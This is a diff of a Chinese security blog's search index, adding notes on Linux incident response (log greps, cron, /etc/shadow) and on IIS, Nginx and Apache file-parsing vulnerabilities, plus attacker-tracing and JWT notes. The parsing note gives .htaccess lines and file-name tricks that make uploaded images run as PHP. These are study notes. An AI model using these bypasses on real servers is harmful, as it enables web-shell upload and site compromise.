+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆后的 shell</span><br></pre></td></tr></table></figure>
+<h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>etc&#x2F;shadow</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
+<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><p>history 命令或 .bash_history 文件查看<br>进入用户目录下导出历史命令<br>cat .bash_history &gt;&gt; history.txt</p>
+<h2 id="异常端口-进程"><a href="#异常端口-进程" class="headerlink" title="异常端口&#x2F;进程"></a>异常端口&#x2F;进程</h2><h3 id="端口-1"><a href="#端口-1" class="headerlink" title="端口"></a>端口</h3><p>查看异常网络连接的PID<br>netstat -antlp</p>
+<h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><p>对应进程文件路径<br>ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe<br>分析进程<br>ps aux | grep PID</p>
+<h2 id="开机启动项-定时任务"><a href="#开机启动项-定时任务" class="headerlink" title="开机启动项&#x2F;定时任务"></a>开机启动项&#x2F;定时任务</h2><h3 id="启动项-1"><a href="#启动项-1" class="headerlink" title="启动项"></a>启动项</h3><p>开启启动等级rc*.d<br>默认级别为rc3.d<br>可疑脚本<br>&#x2F;etc&#x2F;init.d<br>软链接<br>&#x2F;etc&#x2F;rc.d&#x2F;rc*.d</p>
+<table>
+<thead>
+<tr>
+<th align="center">运行级别</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">关机</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">不完全的命令行模式，不含NFS服务</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">完全的命令行模式，就是标准字符界面</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">系统保留</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">图形模式</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">重启动</td>
+</tr>
+</tbody></table>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r</span><br><span class="line">删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br></pre></td></tr></table></figure>
+<h2 id="恶意脚本排查"><a href="#恶意脚本排查" class="headerlink" title="恶意脚本排查"></a>恶意脚本排查</h2><p>more &#x2F;etc&#x2F;cron.d&#x2F;* 查看目录下所有文件<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;*<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;*<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab<br>&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</p>
+<h2 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h2><p>1、查看敏感目录，注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，可使用ls -l查看<br>2、查找webshell同一时间范围内创建的文件<br>find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p>
+<h2 id="日志检查"><a href="#日志检查" class="headerlink" title="日志检查"></a>日志检查</h2><table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
+<td align="center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cups</td>
+<td align="center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td>
+<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td>
+<td align="center">记录邮件信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
+<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
+<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
+<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<p>爆破主机的root帐号的IP数量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+<p>定位爆破的IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br></pre></td></tr></table></figure>
+<p>爆破用户名的字典</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">2、登录成功的IP 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+<p>登录成功的日期、用户名、IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>应急响应流程</tag>
       </tags>
   </entry>
   <entry>
@@ -2340,6 +2348,26 @@
       </categories>
       <tags>
         <tag>Packet Capture</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞知识记录</title>
+    <url>/posts/64ae55e3.html</url>
+    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
+<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
+<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
+<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
+<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
+<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
+<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
+<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
+<p>将所有名字里含shell的文件识别为php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>让.jpg后缀名文件以php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>解析漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2649,7 +2677,7 @@ GAB2 !style=harmonic![gb]4|GAB2 [K: style=harmonic]gbgb|
 C/A,/ C/C/E C/zz2|
 w:Rock-y did-nt like that</div>
 
-<h3 id="series-系列文章"><a href="#series-系列文章" class="headerlink" title="series 系列文章"></a>series 系列文章</h3>
+<h3 id="series-系列文章"><a href="#series-系列文章" class="headerlink" title="series 系列文章"></a>series 系列文章</h3><ol class="series-items"><li><a href="/posts/4a17b156.html" title="Hello World">Hello World</a></li><li><a href="/posts/ab21860c.html" title="本站hexo魔改">本站hexo魔改</a></li></ol>
 
 
 <h1 id="code-test"><a href="#code-test" class="headerlink" title="code test"></a>code test</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#calendar&#x27;</span>).<span class="title function_">aCalendar</span>(<span class="string">&#x27;zh-CN&#x27;</span>);<span class="comment">//&#x27;zh-CN&#x27;请根据自己博客的语言选择</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
@@ -2692,36 +2720,54 @@ w:Rock-y did-nt like that</div>
       </tags>
   </entry>
   <entry>
-    <title>解析漏洞知识记录</title>
-    <url>/posts/64ae55e3.html</url>
-    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
-<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
-<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
-<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
-<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
-<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
-<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
-<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
-<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
-<p>将所有名字里含shell的文件识别为php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>让.jpg后缀名文件以php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>解析漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>溯源小技巧</title>
     <url>/posts/7dea39be.html</url>
     <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="溯源反制思路"><a href="#溯源反制思路" class="headerlink" title="溯源反制思路"></a>溯源反制思路</h2><p>反向渗透攻击IP、反向信息收集攻击IP、利用部署的蜜罐获取攻击者信息、溯源钓鱼邮件</p>
 <h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等。<br>日志与流量分析，异常的通讯流量、攻击源与攻击目标等。<br>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等。<br>邮件钓鱼，获取恶意文件样本、钓鱼网站URL等。<br>蜜罐系统，获取攻击者行为、意图的相关信息。</p>
 <h1 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h1><h2 id="反制手段"><a href="#反制手段" class="headerlink" title="反制手段"></a>反制手段</h2><p>IP定位技术：根据IP定位物理地址—代理IP。<br>ID追踪术：搜索引擎、社交平台、技术论坛、社工库匹配。<br>网站URL：域名WHOIS查询注册人姓名、地址、电话和邮箱。<br>恶意样本：提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析。<br>社交账号：基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等。</p>
 <h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径；<br>攻击目的：拿到权限、窃取数据、获取利益、DDOS等；<br>网络代理：代理IP、跳板机、C2服务器等；<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等。<br>攻击者身份画像：虚拟身份：ID、昵称、网名；真实身份：姓名、物理位置；<br>联系方式：手机号、QQ&#x2F;微信、邮箱；<br>组织情况：单位名称、职位信息。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="威胁情报厂商"><a href="#威胁情报厂商" class="headerlink" title="威胁情报厂商"></a>威胁情报厂商</h2><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>启明Venuseye：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a><br>绿盟NTI:<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a><br>奇安信：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><br>安恒：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a><br>360：<a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p>
-<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>中国万网域名WHOIS信息查询地址：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>纳网域名WHOIS信息查询地址：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>中资源域名WHOIS信息查询地址：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名WHOIS信息查询地址：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>新网互联域名WHOIS信息查询地址：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a><br>美橙互联域名WHOIS信息查询地址：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>爱名网域名WHOIS信息查询地址：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>易名网域名WHOIS信息查询地址：<a href="https://whois.ename.net/">https://whois.ename.net/</a><br>站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)<br>Kali的查询：whois -h 注册服务器地址  域名<br>站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>国外的who.is：<a href="https://who.is/">https://who.is/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>还有Kali中自带的whois查询、一些集成工具等。<br>SSL证书查询网站整理如下：<br>主要网站如下：<br>（1）<a href="https://crt.sh/">https://crt.sh/</a><br>（2）<a href="https://censys.io/">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p>
-<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><p>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a><br>爱站： <a href="https://www.aizhan.com/">https://www.aizhan.com/</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
-<h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p>公众号：埃文科技、云警助手等<br>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a> <a href="https://chaipip.com/aiwen.html">https://chaipip.com/aiwen.html</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="威胁情报厂商"><a href="#威胁情报厂商" class="headerlink" title="威胁情报厂商"></a>威胁情报厂商</h2><ul>
+<li><a href="https://x.threatbook.cn/">微步在线</a></li>
+<li><a href="https://www.venuseye.com.cn/">启明Venuseye</a></li>
+<li><a href="https://nti.nsfocus.com/">绿盟NTI</a></li>
+<li><a href="https://ti.qianxin.com/">奇安信</a></li>
+<li><a href="https://ti.dbappsecurity.com.cn/">安恒</a></li>
+<li><a href="https://ti.360.cn/#/homepage">360</a></li>
+</ul>
+<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><ul>
+<li><a href="https://whois.aliyun.com/">中国万网域名WHOIS查询</a></li>
+<li><a href="http://whois.nawang.cn/">纳网域名WHOIS查询</a></li>
+<li><a href="https://www.zzy.cn/domain/whois.html">中资源域名WHOIS查询</a></li>
+<li><a href="https://cp.35.com/chinese/whois.php">三五互联域名WHOIS查询</a></li>
+<li><a href="http://www.dns.com.cn/show/domain/whois/index.do">新网互联域名WHOIS查询</a></li>
+<li><a href="https://whois.cndns.com/">美橙互联域名WHOIS查询</a></li>
+<li><a href="https://www.22.cn/domain/">爱名网域名WHOIS查询</a></li>
+<li><a href="https://whois.ename.net/">易名网域名WHOIS查询</a></li>
+<li><a href="http://whois.chinaz.com/">站长工具类第三方查询</a></li>
+<li><a href="https://whois.aizhan.com/">爱站网域名WHOIS查询</a></li>
+<li><a href="https://whois.cloud.tencent.com/">腾讯云域名WHOIS查询</a></li>
+<li><a href="https://who.is/">国外的who.is</a></li>
+<li><a href="https://x.threatbook.cn/">微步</a></li>
+<li><a href="https://www.virustotal.com/">Virus Total</a></li>
+</ul>
+<p>还有Kali中自带的whois查询、一些集成工具等。<br>SSL证书查询网站整理如下：<br>主要网站如下：</p>
+<ul>
+<li><a href="https://crt.sh/">crt.sh</a></li>
+<li><a href="https://censys.io/">Censys</a></li>
+<li><a href="https://developers.facebook.com/tools/ct/">Facebook CT Tools</a></li>
+<li><a href="https://google.com/transparencyreport/https/ct/">Google Transparency Report</a></li>
+</ul>
+<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><ul>
+<li><a href="https://www.ipip.net/ip.html">IPIP</a></li>
+<li><a href="https://www.aizhan.com/">爱站</a></li>
+<li><a href="http://whois.chinaz.com/">站长之家</a></li>
+</ul>
+<h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p>公众号：埃文科技、云警助手等</p>
+<ul>
+<li>公众号：埃文科技、云警助手等</li>
+<li><a href="https://www.ipip.net/ip.html">IPIP</a></li>
+<li><a href="https://chaipip.com/aiwen.html">CHAIPIP</a></li>
+</ul>
 <h1 id="确认个人信息"><a href="#确认个人信息" class="headerlink" title="确认个人信息"></a>确认个人信息</h1><h2 id="已知手机或邮箱"><a href="#已知手机或邮箱" class="headerlink" title="已知手机或邮箱"></a>已知手机或邮箱</h2><p>查支付宝转账，验证姓名。<br>QQ &#x2F;微信添加好友搜索<br>reg007进行相同手机号注册平台搜索<br>社交平台查找(头条、抖音、微博等)</p>
 <h2 id="已知ID或姓名"><a href="#已知ID或姓名" class="headerlink" title="已知ID或姓名"></a>已知ID或姓名</h2><p>直接谷歌、百度、bing关键次搜索<br>各大平台SRC、各大白帽子交流群、交流论坛等<br>社交平台查找(贴吧、头条、抖音、微博等)</p>
 <h2 id="捕获恶意文件"><a href="#捕获恶意文件" class="headerlink" title="捕获恶意文件"></a>捕获恶意文件</h2><p>解密、逆行脱壳等直接获取一些个人账号ID、CS服务器地址、一些域名信息、邮件发送服务器地址等</p>
@@ -2778,7 +2824,7 @@ w:Rock-y did-nt like that</div>
 <h2 id="exp绕过"><a href="#exp绕过" class="headerlink" title="exp绕过"></a>exp绕过</h2><p>JWT令牌中通常会包含过期时间（exp）。如果令牌未正确处理过期时间，攻击者可能会修改令牌中的exp字段，使其延长有效期，从而绕过过期时间限制。</p>
 <h2 id="token重放"><a href="#token重放" class="headerlink" title="token重放"></a>token重放</h2><p>攻击者获取JWT令牌后，可能会在令牌过期之前反复使用它（如利用长时间的会话保持），从而进行会话劫持。</p>
 <h2 id="不安全的存储"><a href="#不安全的存储" class="headerlink" title="不安全的存储"></a>不安全的存储</h2><p>如果JWT令牌在客户端（如浏览器）中存储不当（例如存储在localStorage或sessionStorage中），攻击者可能通过XSS攻击窃取令牌。</p>
-<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>虽然JWT令牌本身经过加密或签名，但如果负载部分（如用户身份信息、权限等）没有加密或不小心暴露，攻击者可以直接读取其中的信息，进行数据泄露攻击。<br>靶场: <a href="https://portswigger.net/web-security/jwt">https://portswigger.net/web-security/jwt</a></p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>虽然JWT令牌本身经过加密或签名，但如果负载部分（如用户身份信息、权限等）没有加密或不小心暴露，攻击者可以直接读取其中的信息，进行数据泄露攻击。<br><a href="https://portswigger.net/web-security/jwt">PortSwigger-JWT靶场</a></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -2957,7 +3003,7 @@ w:Rock-y did-nt like that</div>
   <entry>
     <title>ewomail钓鱼邮件服务器搭建</title>
     <url>/posts/2de21c49.html</url>
